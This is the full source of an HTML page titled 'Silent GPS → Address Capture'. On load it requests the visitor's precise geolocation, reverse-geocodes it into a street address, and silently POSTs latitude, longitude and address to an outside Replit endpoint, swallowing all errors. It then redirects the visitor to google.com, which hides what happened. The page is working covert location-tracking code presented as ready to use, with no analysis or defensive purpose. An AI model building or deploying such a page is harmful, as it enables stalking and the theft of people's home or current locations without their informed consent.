<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Silent GPS â†’ Address Capture</title>
<style>
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;margin:20px;}
  #status{margin-top:12px; white-space: pre-line;}
</style>
</head>
<body>
<p id="status">Status: idle</p>

<script>
const STATUS = document.getElementById('status');

// ==== CONFIGURE THIS ====
const SHEET_URL = "https://1d27b3e0-a347-472b-8a8f-3e7f4825e9ce-00-z30wnkqijskb.janeway.replit.dev/receive";
// =======================

function setStatus(msg){ STATUS.textContent = 'Status: ' + msg; }

function copyToClipboard(text){
  navigator.clipboard.writeText(text).catch(()=>{});
}

function sendToServer(data){
  fetch(SHEET_URL, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify(data)
  }).catch(()=>{});
}

function reverseGeocode(lat, lon){
  const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
  fetch(url, {headers: {'User-Agent':'High-Precision-GPS-Test'}})
    .then(res=>res.json())
    .then(data=>{
      const addr = data.display_name ?? "N/A";
      const text = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: ${addr}`;
      copyToClipboard(text);
      sendToServer({lat, lon, addr});
      setStatus('Location captured and copied. Redirecting...');
      setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
    })
    .catch(err=>{
      const text = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: N/A`;
      copyToClipboard(text);
      sendToServer({lat, lon, addr:null});
      setStatus('Location captured (no address). Redirecting...');
      setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
    });
}

function onSuccess(pos){
  const c = pos.coords;
  reverseGeocode(c.latitude, c.longitude);
}

function onError(err){
  setStatus('Geolocation error. Redirecting...');
  setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
}

function requestLocation(){
  if(!('geolocation' in navigator)){
    setStatus('Geolocation not supported. Redirecting...');
    setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
    return;
  }
  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 30000,
    maximumAge: 0
  });
}

// Attempt automatically
setTimeout(requestLocation, 300);
</script>
</body>
</html>
